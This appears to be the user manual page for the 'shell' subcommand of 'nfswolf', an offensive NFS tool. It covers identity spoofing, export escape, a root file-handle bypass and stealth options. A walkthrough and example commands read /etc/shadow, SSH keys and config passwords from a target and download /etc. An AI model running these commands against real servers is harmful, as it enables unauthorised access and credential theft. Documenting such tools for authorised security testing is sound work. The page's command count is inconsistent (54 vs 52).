# Shell

The `shell` subcommand opens an interactive readline REPL over a remote NFS export. It works entirely in userspace via raw ONC RPC calls, with no kernel NFS client needed, no `mount(8)`, and no root privileges on the attacker's machine. The shell supports 54 commands across navigation, file operations, credential manipulation, security scanning, and export escape.

## Usage

```
nfswolf shell <target>[:/export] [options]
```

Target formats (same across every subcommand):

| Format | Meaning |
|--------|---------|
| `host:/export` | Mount the named export |
| `host -e /export` | Same, via `--export` flag |
| `host --handle HEX` | Bypass MOUNT entirely, use a raw file handle as root |
| `host` | Mount `/` (rare) |

## Options

### Target

| Flag | Description |
|------|-------------|
| `-e`, `--export PATH` | Export path (alternative to appending `:/export` to the positional target) |
| `--handle HEX` | Use a raw file handle as the shell root. Skips the MOUNT RPC entirely. Obtain handles from `nfswolf escape`, `nfswolf brute-handle`, or the `handle` shell command. |

### Behavior

| Flag | Description |
|------|-------------|
| `--nfs-version VER` | NFS protocol version: `2`, `3`, or `4`. Auto-detected if omitted (probes v3, then v2, then v4). |
| `-c`, `--command CMD` | Run a single command non-interactively then exit. Useful for scripting. |

### Permissions

| Flag | Description |
|------|-------------|
| `--allow-write` | Enable write operations (`put`, `mkdir`, `rm`, `chmod`, `chown`, `symlink`, `link`, `mknod`, etc.). Without this flag, all mutating commands are blocked. |

### Identity

| Flag | Description |
|------|-------------|
| `--short-token HEX` | AUTH_SHORT session token (replays server-issued opaque credential instead of AUTH_SYS) |
| `--auth-dh-netname NAME` | AUTH_DH network name (e.g. `unix.0@domain`); requires `--auth-dh-pubkey`; Solaris/Illumos only |
| `--auth-dh-pubkey HEX` | Server's DH public key (48 hex chars = 192 bits) |

### Global options (apply to all subcommands)

| Flag | Description |
|------|-------------|
| `-u`/`-g`, `--uid`/`--gid N` | AUTH_SYS UID and GID |
| `--hostname NAME` | AUTH_SYS machine name |
| `--aux-gids N,N,...` | Auxiliary group list |
| `--privileged-port` | Bind below port 1024 (for `secure` exports; requires root) |
| `--proxy HOST:PORT` | SOCKS5 proxy |
| `--delay MS`, `--jitter MS` | Stealth pacing between RPC calls |
| `--nfs-port PORT` | Override NFS data port (default: 2049) |

## Shell features

### Auto-version detection

When `--nfs-version` is omitted, the shell probes the server before connecting:

1. **NFSv3** via portmapper GETPORT (program 100003, version 3) + RPC NULL verification
2. **NFSv2** via portmapper GETPORT (program 100003, version 2) + RPC NULL verification
3. **NFSv4** via direct COMPOUND to port 2049 (no portmapper required)

v3 is tried first because it is the most common deployment. v2 before v4 because v2 servers tend to have weaker security controls. v4 last because it works even when portmapper (TCP/111) is firewalled. GETPORT alone is not sufficient since some portmappers register all NFS versions against a daemon that only speaks a subset, so the shell sends a NULL RPC to verify each claim.

### Auto-credential escalation

When the shell encounters a permission denial, it automatically tries different AUTH_SYS credentials using an evidence-driven ladder:

1. File owner UID (from GETATTR)
2. Caller UID with the file's GID
3. Root (UID 0)
4. Identities harvested from READDIRPLUS, ranked by frequency
5. Common service accounts (www-data, nobody, etc.)

The ladder prunes itself based on mode bits: if `mode & 0o007 == 0`, service-account rungs are skipped because no "other" access exists. This works across all three NFS versions.

### Tab completion

Tab completion works for both command names and remote file/directory paths. The shell maintains a directory cache that is refreshed after every `cd`, so Tab produces accurate results without an extra round trip on the first press.

### Readline key bindings

Standard readline key bindings are supported: Ctrl-A (beginning of line), Ctrl-E (end of line), Ctrl-R (reverse history search), Ctrl-W (delete word), up/down arrow (history navigation).

### Non-interactive mode

The `-c` flag runs a single command and exits, making the shell usable in scripts and pipelines:

```bash
# Read /etc/passwd from a remote export
nfswolf shell 10.0.0.1:/srv -c "cat /etc/passwd"

# Download an entire directory tree
nfswolf shell 10.0.0.1:/srv -c "get -r /etc ./remote-etc"

# Scan for SUID binaries
nfswolf shell 10.0.0.1:/srv -c "suid-scan"
```

### File integrity verification

The `get` command computes SHA-256 over every downloaded file and prints the hash alongside the byte count. Use `--verify` to assert a known hash:

```bash
nfswolf shell 10.0.0.1:/srv -c "get --verify a1b2c3d4e5f6... /etc/shadow ./shadow"
```

### Dynamic prompt

The prompt reflects the current state and updates mid-session when you change identity or directory:

```
nfswolf@10.0.0.1:/ uid=1000 gid=1000>
nfswolf@10.0.0.1:/etc uid=0 gid=0>
nfswolf@10.0.0.1:/ [escaped] uid=0 gid=0>
nfswolf@10.0.0.1:/ uid=33 gid=33 [v2]>
```

## First session walkthrough

??? example "Full session: connect, escalate, escape, scan, exfiltrate"

    ```
    $ nfswolf shell 10.0.0.5:/srv/nfs
    [*] No --nfs-version specified, probing server...
    [+] Detected NFSv3 on port 2049
    [*] Mounting 10.0.0.5:/srv/nfs
    [+] Connected to 10.0.0.5 as uid=1000 gid=1000   --   type 'help' for commands

    nfswolf@10.0.0.5:/ uid=1000 gid=1000> ls
    mode        uid       gid          size  mtime                name
    ---------------------------------------------------------------------------
    drwxr-xr-x        0        0        4096  2025-06-01 10:00  .
    drwxr-xr-x       33       33        4096  2025-07-15 14:30  webapp
    -rw-r--r--         0        0        1847  2025-05-20 11:00  config.yml

    nfswolf@10.0.0.5:/ uid=1000 gid=1000> cat config.yml
    database:
      host: localhost
      password: s3cret_db_pass

    nfswolf@10.0.0.5:/ uid=1000 gid=1000> escape-root
    [+] escaped to filesystem root (ext4, inode 2)
        handle: 01000007020000020000000001000000...

    nfswolf@10.0.0.5:/ [escaped] uid=1000 gid=1000> cat /etc/shadow
    root:$6$xyz...:19500:0:99999:7:::

    nfswolf@10.0.0.5:/ [escaped] uid=1000 gid=1000> suid-scan
    [*] scanning for SUID/SGID binaries...
    [!] SUID 4755  uid=0  /usr/bin/passwd
    [!] SUID 4755  uid=0  /usr/bin/sudo

    nfswolf@10.0.0.5:/ [escaped] uid=1000 gid=1000> secrets-scan
    [*] scanning for secrets and credentials...
    [!] potential secret: /root/.ssh/id_rsa  (1675 bytes  0600)
    [!] potential secret: /etc/shadow  (1204 bytes  0640)

    nfswolf@10.0.0.5:/ [escaped] uid=1000 gid=1000> get -r /etc ./evidence/etc
    saved 2847392 bytes -> ./evidence/etc/

    nfswolf@10.0.0.5:/ [escaped] uid=1000 gid=1000> exports
    Discovering reachable exports via parent traversal...
    Reached top: / (depth 2)
      [+]  /srv/nfs                                  12 entries  uid=0  mode=0755
      [+]  /home                                      3 entries  uid=0  mode=0755
      [!]  /var/backups                               access denied
    3 directories discovered

    nfswolf@10.0.0.5:/ [escaped] uid=1000 gid=1000> exit
    ```

## MOUNT bypass with --handle

When portmapper or mountd is firewalled but you have a valid file handle (from a previous escape, brute-force, or packet capture), `--handle` connects directly to the NFS data port without any MOUNT RPC:

```bash
nfswolf shell 10.0.0.5 --handle 01000007020000020000000001000000... --nfs-version 3
```

This is the intended workflow after `nfswolf escape` produces a root handle. File handles are bearer tokens (RFC 1094 S2.3.3, RFC 2623 S2.6), so any handle works regardless of how it was obtained.

## NFSv2 and NFSv4 shells

All three protocol versions share the same 52-command set through the unified `NfsShell<O: ShellOps>` architecture. A few commands are version-specific:

| Command | v2 | v3 | v4 |
|---------|:--:|:--:|:--:|
| `root` (probe NFSPROC_ROOT) | Yes | -- | -- |
| `mknod` (create device node) | -- | Yes | Yes |
| `verifier` (write verifier probe) | -- | Yes | -- |

NFSv2 identity changes work by reconnecting: new TCP socket + new AUTH_SYS credentials + re-MOUNT. NFSv3 and NFSv4 swap credentials on the existing connection without reconnecting.

## See also

- [Shell Commands](shell-commands.md) -- Complete reference for all 54 commands
- [Mount](mount.md) -- FUSE mount for using standard tools against NFS exports
- [Escape](escape.md) -- Export escape algorithm and filesystem support matrix
- [Global Options](global-options.md) -- All flags that apply across subcommands
